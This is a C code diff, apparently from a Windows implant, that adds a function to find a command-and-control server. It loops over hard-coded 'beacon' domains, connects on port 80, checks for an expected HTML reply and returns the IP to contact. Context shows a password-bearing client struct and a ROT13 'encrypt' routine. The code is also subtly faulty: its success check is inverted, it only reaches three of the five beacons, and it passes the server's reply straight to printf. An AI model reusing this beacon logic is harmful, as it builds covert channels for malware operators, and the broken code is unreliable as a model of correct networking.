@@ -19,6 +19,119 @@ typedef struct otherClient {
     char password[30];
 };
 
+static int resolveBeaconServerIPAddr(char* ipAddressBuf) {
+    // Return values
+    // 0 = Success, ip successfully resolved
+    // 1 = WSAStartup could not be initialized
+    // 2 = Resolving ip address method failed
+    // 3 = No ip addresses could be successfully resolved
+
+    char beacons[5][24] = {
+        "beacon1.javalanche.net",
+        "beacon2.javalanche.net",
+        "beacon3.javalanche.net",
+        "beacon4.javalanche.net",
+        "beacon5.javalanche.net"
+    };
+    PSTR resolvedIP = (PSTR)calloc(20, sizeof(PSTR));
+    char serverResponse[1024];
+
+    int attemptedTries = 0;
+
+    while (attemptedTries < 25) {
+        printf("Resolve #%d\n", attemptedTries);
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            return 1;
+        }
+
+        // Variables for resolving IP Address
+        struct addrinfo hints;
+        struct addrinfo* result, * rp;
+
+        // Variable for checking to make sure that functions worked correctly
+        int status;
+
+        // Variables for connecting to resolved ip address to ensure connectivity
+        struct sockaddr_in resolvedServerAddr;
+        SOCKET resolvedClientSocket;
+
+        resolvedClientSocket = socket(AF_INET, SOCK_STREAM, 0);
+        if (resolvedClientSocket == -1) {
+            perror("Error creating socket");
+            exit(-1);
+        }
+
+        // Use TCP and IPv4
+        memset(&hints, 0, sizeof(hints));
+        hints.ai_family = AF_INET;
+        hints.ai_socktype = SOCK_STREAM;
+
+        // Use getaddrinfo to resolve the address.
+        status = getaddrinfo(beacons[attemptedTries % 3], NULL, &hints, &result);
+        if (status != 0) {
+            WSACleanup();
+            return 2;
+        }
+
+        // Iterate through the results to find the first IPv4 Address
+        for (rp = result; rp != NULL; rp = rp->ai_next) {
+            printf("Looping\n");
+            struct sockaddr_in* ipv4 = (struct sockaddr_in*)rp->ai_addr;
+            void* addr = &(ipv4->sin_addr);
+
+            // Zero out the resolved IP buffer
+            //for (int i = 0; i < 20; i++) resolvedIP[i] = '\0';
+
+            if (inet_ntop(AF_INET, addr, resolvedIP, 20) != NULL) {
+                // We've Successfully resolved the IPv4 address. Store the result in resolvedIP
+                // Now, check to make sure that we can connect to this beacon 
+
+                printf("Resolved IP: %s\n", resolvedIP);
+                wchar_t wideResolvedIPAddress[16];
+                size_t convertedChars = 0;
+                mbstowcs_s(&convertedChars, wideResolvedIPAddress, sizeof(wideResolvedIPAddress) / sizeof(wchar_t), resolvedIP, _TRUNCATE);
+                resolvedServerAddr.sin_family = AF_INET;
+                InetPton(AF_INET, wideResolvedIPAddress, &resolvedServerAddr.sin_addr.s_addr);
+                resolvedServerAddr.sin_port = htons(80);
+
+                // Connect to server
+                int connectResult = connect(resolvedClientSocket, (struct sockaddr*)&resolvedServerAddr, sizeof(resolvedServerAddr));
+                if (connectResult != 0) {
+                    int error = WSAGetLastError();
+                    printf("Error Code: %d\n", error);
+                    exit(error);
+                }
+
+                // Send a Get Request to the Server
+                const char* osMessage = "GET / HTTP/1.1\n";
+                send(resolvedClientSocket, osMessage, strnlen(osMessage, 20), 0);
+
+                for (int i = 0; i < 1024; i++) serverResponse[i] = '\0';
+                int bytesRead = recv(resolvedClientSocket, serverResponse, 1023, 0);
+                serverResponse[bytesRead] = '\0';
+                printf(serverResponse);
+
+                char expectedOutput[] = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>My First HTML Page</title>\r\n</head>\r\n<body>\r\n<h1>Welcome to My Website</h1>\r\n</body>\r\n</html>\r\n";
+                if (strncmp(serverResponse, expectedOutput, size_t(200))) {
+                    // Once we have confirmed that we can communicate with the Server, return this ip address
+                    // as the one to reach out to.
+                    strcpy_s(ipAddressBuf, rsize_t(20), resolvedIP);
+                    freeaddrinfo(result);
+                    WSACleanup();
+                    return 0;
+                }
+            }
+        }
+
+        // Failed to resolve an IPv4 address.
+        freeaddrinfo(result);
+        WSACleanup();
+        attemptedTries += 1;
+    }
+    return 3;
+}
+
 static void encrypt(char* plainText) {
     // This function takes a pointer to a string, and rotates the characters by 13
     // Because the Ceaser Cipher we are using is 13 characters, the same cipher can be applied
